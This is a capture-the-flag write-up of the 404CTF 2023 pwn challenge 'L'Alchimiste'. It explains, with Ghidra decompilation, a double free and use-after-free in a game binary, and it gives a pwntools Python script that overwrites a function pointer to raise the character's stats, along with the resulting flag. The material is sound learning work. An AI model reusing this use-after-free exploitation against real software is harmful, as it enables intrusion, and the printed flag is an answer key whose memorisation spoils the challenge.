---
title: CTFs | 404CTF2023 | Pwn | L'Alchimiste
author: Stillwolfing
date: 2023-06-13
categories: ['CTFs', '404CTF2023', 'Pwn']
tags: ['CTFs', '404CTF2023', 'Pwn']
permalink: /CTFs/404CTF2023/pwn/l_alchimiste
---

## Context

![context](/assets/img/CTFs/404CTF2023/pwn/l_alchimiste/context.png)

We connect to netcat to know more:

![context](/assets/img/CTFs/404CTF2023/pwn/l_alchimiste/nc.png)

We can:

1. Buy a strength elixir.
1. drink a strength elixir.
1. Talk to the alchemist.
1. show stats.
1. get the key.
1. get out.

If we try to get the key, we get:

![kay_fail](/assets/img/CTFs/404CTF2023/pwn/l_alchimiste/key_fail.png)

We don't have enough stats.

Here are our base stats:

![kay_fail](/assets/img/CTFs/404CTF2023/pwn/l_alchimiste/stats_base.png)

We have 100 in strength, 50 in mind and 100 golds.

We can buy a strength potion for 50 to get 10 strength.

Of course it's not enough to pass the test.

## Resolution

Let's use ghidra to analyze the executable.

### Character creation

Here is how the character is created:

![createCharacter](/assets/img/CTFs/404CTF2023/pwn/l_alchimiste/createCharacter.png)

*perso is the strength, *(perso + 4) is the mind and *(perso + 8) is gold. All three are integers.

### Bug

Here is a bug:

![double_free](/assets/img/CTFs/404CTF2023/pwn/l_alchimiste/double_free.png)

Why does this happen? Let's investigate !

### Buy Strength Potion

Here is the function to get another strength elixir:

![buyStrUpPotion](/assets/img/CTFs/404CTF2023/pwn/l_alchimiste/buyStrUpPotion.png)

The address of the function incStr is placed on at the address (perso + 0x10). Then if we have more than 50 gold, the value of gold is decreased by 50.

So buying a strength potion is just placing the address of the incStr function at (perso + 0x10).

### Use Item

The function to use the strength potion is this one:

![useItem](/assets/img/CTFs/404CTF2023/pwn/l_alchimiste/useItem.png)

We call the function placed at (perso + 0x10) + 0x40. Then we free the (perso + 0x10).

Now we can understand why the bug occurs. We buy a strength potion (allocate perso + 0x10, then place the address of incStr at perso + 0x10, then decrease 50 gold if enough).

Then we call the function useItem. Our strength is increased adn the address perso + 0x10 is freed.

When we call again the function useItem, our strength is increased (because the address value is not put to NULL before being released). Then we try to free it again even if it's already freed.

So, we get the double free.

### Exploit this bug

We can allocate and place the function without paying. So, we can repeatedly buy and use to increase our strength. This is a Use-After-Free (UAF) vulnerability.

### view_flag function

Here is the function view_flag:

![view_flag](/assets/img/CTFs/404CTF2023/pwn/l_alchimiste/view_flag.png)

To get the flag, we 150 in strength and 150 in mind. We need to find a way to increase our mind stat.

### send Message function

Here is the send message function.

![sendMessage](/assets/img/CTFs/404CTF2023/pwn/l_alchimiste/sendMessage.png)

Here we allocate 0x48 and do not free it afterward. So we call also do the use-after-free to increase the strength with this function and the useItem function (after buying of strength potion).

We can the address of the incInt function with Ghidra and replace the value where IncStr is placed with the address of incInt.

Then spam useItem and sendMessage to do a UAF with the incInt function instead.

Here my code to do it:

```python
import pwn

def send_receive(r, msg):
    r.sendline(msg)
    rep = r.recvuntil(b">>>").decode()
    print(rep)


def sendMsg(r, msg):
    r.sendline(b'3')
    r.recvuntil(b": ")
    r.sendline(msg)
    rep = r.recvuntil(b">>>").decode()
    print(rep)


def increase_str(r, num):
    
    send_receive(r, "1")
    send_receive(r, "2")

    for i in range(num - 1):
        sendMsg(r, "A")
        send_receive(r, "2")
    
    send_receive(r, "4")



def increase_int(r, num):
    payload = b"\x41" * 0x40 + pwn.p64(0x004008d5)
    sendMsg(r, payload)
    send_receive(r, "2")

    for i in range(num - 1):
        sendMsg(r, "A")
        send_receive(r, "2")
    send_receive(r, "4")
    

# Connect to the server
r = pwn.remote("challenges.404ctf.fr", 30944)

rep = r.recvuntil(b">>> ").decode()
print(rep)

increase_str(r, 5)

increase_int(r, 10)

r.sendline(b'5')
response = r.recvuntil(b"}")
print(response)

```

We increase our strength and our intelligence to 150 then we get the flag.

![flag](/assets/img/CTFs/404CTF2023/pwn/l_alchimiste/flag.png)

Flag: 404CTF{P0UrQU01_P4Y3r_QU4ND_135_M075_5UFF153N7}
